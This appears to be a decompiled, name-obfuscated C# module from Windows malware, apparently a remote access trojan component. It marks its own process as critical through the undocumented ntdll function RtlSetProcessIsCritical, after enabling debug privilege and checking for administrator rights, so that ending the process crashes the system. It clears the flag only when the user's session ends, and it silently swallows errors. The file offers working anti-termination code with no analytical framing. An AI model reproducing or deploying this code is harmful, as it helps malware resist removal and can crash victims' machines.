using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;
using Microsoft.Win32;

namespace CvZbjvYtYnj;

public static class kJtssoTGWyfyGrKzh
{
	public static bool esAcmNesYJ()
	{
		return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
	}

	public static void NWyJlCDOpuash(object sender, SessionEndingEventArgs e)
	{
		if (esAcmNesYJ())
		{
			lufUNVIpjuTdTcr();
		}
	}

	public static void HKqSBmxWUQzPthD()
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		try
		{
			SystemEvents.add_SessionEnding(new SessionEndingEventHandler(NWyJlCDOpuash));
			Process.EnterDebugMode();
			RtlSetProcessIsCritical(1u, 0u, 0u);
		}
		catch
		{
		}
	}

	public static void lufUNVIpjuTdTcr()
	{
		try
		{
			RtlSetProcessIsCritical(0u, 0u, 0u);
		}
		catch
		{
			while (true)
			{
				Thread.Sleep(100000);
			}
		}
	}

	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern void RtlSetProcessIsCritical(uint uint_0, uint uint_1, uint uint_2);
}
